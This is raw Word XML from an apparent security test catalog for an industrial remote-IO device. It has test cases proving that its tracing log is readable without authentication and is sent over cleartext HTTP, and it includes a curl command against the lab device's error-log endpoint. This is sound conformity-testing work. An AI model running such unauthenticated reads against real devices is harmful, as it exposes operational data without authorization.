          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (arbitrary node); TS-2 passive on the laptop mirror. Isolated Zone-B, PLC-monitored. </w:t>
      </w:r>
      <w:hyperlink r:id="rId349" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId350" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="189E41C5" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="62BFCBC3">
          <v:rect id="_x0000_i1111" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4DD1C6" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66755D0A" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the decisive unauthenticated-read proof (TS-1 → G-1/G-2) and the cleartext-confidentiality proof (TS-2 → CR 4.1/4.3). </w:t>
      </w:r>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve">TS-3/TS-4 follow </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>the</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>established</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>templates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>request</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7F26BE" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="72F8F079">
          <v:rect id="_x0000_i1112" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFE2643" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ014-01 — Unauthenticated Tracing-Log Read (G-1 / G-2 proof — decisive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300E86A6" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8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755"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="4962A0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504B86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6E1683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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="201C1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B7EF0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1B8D2" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TC-RQ014-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="4E1FD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9D90E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8F22F" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">RQ-014 (EHSR 1.1.9 §3, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>access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restriction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>) → CR 1.1/1.2 / CR 2.1 / CR 3.9 → Asset I, Asset H</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="4516A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AA929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8677B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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Information Disclosure + missing authorization boundary</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="4E586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15605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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8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DB86A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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="331725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F6B60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70D55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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Demonstrate that the tracing (error) log is fully readable by an </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>arbitrary, unauthenticated node</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> on the network segment, with </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no identity, authentication, authorization, or purpose-limitation</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> — directly violating the requirement that access be restricted </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>exclusively</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> to a competent-authority request.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="33870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18FF8E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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8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0973E" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. From a node with only network access (no credentials, no configuration privilege), request the error-log endpoint. 2. Confirm the full log content is returned. 3. Confirm no authentication challenge, session, or authorization check is presented at any point. </w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">4. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Confirm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no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purpose</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>requestor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field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is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required</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="58513B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AD362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C4F76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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the log read requires authentication </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a purpose-limited authorization (competent-authority context). </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the log is returned to an unauthenticated arbitrary node with no gate → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-1/G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> non-conformity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F584155" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8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1D17A8" w:rsidRPr="001D17A8" w14:paraId="0465FC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CF29C1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819CB8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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="74193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3533A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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A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CABD7" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TC-RQ014-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="75B22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4C0AD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05CBA" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Pi (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>arbitrary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node</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>) eth1 = 192.168.50.10 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>) / eth0 (OT); DUT 192.168.0.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="04DED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69A4A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9EB90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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">curl (no credentials); optional OWASP ZAP (per </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> CM-004) to confirm no auth flow</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="5EA21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5F439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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Commands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72924" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C294CFB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># TC-RQ014-01 Read the tracing log with NO credentials from an arbitrary node</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277AE252" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s -i </w:t>
      </w:r>
      <w:hyperlink r:id="rId351" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1401_log_read.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304932EA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># confirm: HTTP 200 + full log body, NO 401/403, NO WWW-Authenticate header, NO session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03330DA8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>grep -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -E 'HTTP/|WWW-Authenticate|Set-Cookie|401|403' TC1401_log_read.txt || &lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589FA6EB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>echo "No authentication/authorization challenge present"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD36ABF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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | HTTP 200 with full log; no WWW-Authenticate, no session, no purpose field (SRIO-10662; auth dropped SRIO-8299). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Log returned unauthenticated (G-1/G-2 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1401_log_read.txt (headers + body), optional ZAP report showing no auth context | </w:t>
      </w:r>
      <w:hyperlink r:id="rId352" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId353" w:history="1">
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="007E038F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6CB32F60" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="532E3CBB">
          <v:rect id="_x0000_i1113" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="312D57CF" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ014-02 — Cleartext Confidentiality of the Tracing Log (CR 4.1 / 4.3 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338E6343" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Level 1 — Abstract Test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741"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="4AEC30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82CA9E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A401F7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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="31BF3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3168E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53E99" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TC-RQ014-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="5925C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CC4FA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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Traceability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D5515" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>RQ-014 → CR 4.1 / CR 4.3 → Asset I, Asset H</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="25876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0D1FF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Target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4EA25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 xml:space="preserve">Information Disclosure (passive </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>eavesdropping</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="5A3A4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1EBDF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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8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2AAAB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SVV-3</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Vulnerability</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="00AD42B6" w14:paraId="107BC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CC92B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E212D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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Demonstrate that tracing-log content is transmitted in </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>cleartext HTTP</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and can be captured passively by any on-segment eavesdropper, and that </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>no TLS</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> option exists — so even the coarse network-boundary assumption does not protect log confidentiality in transit.</w:t>
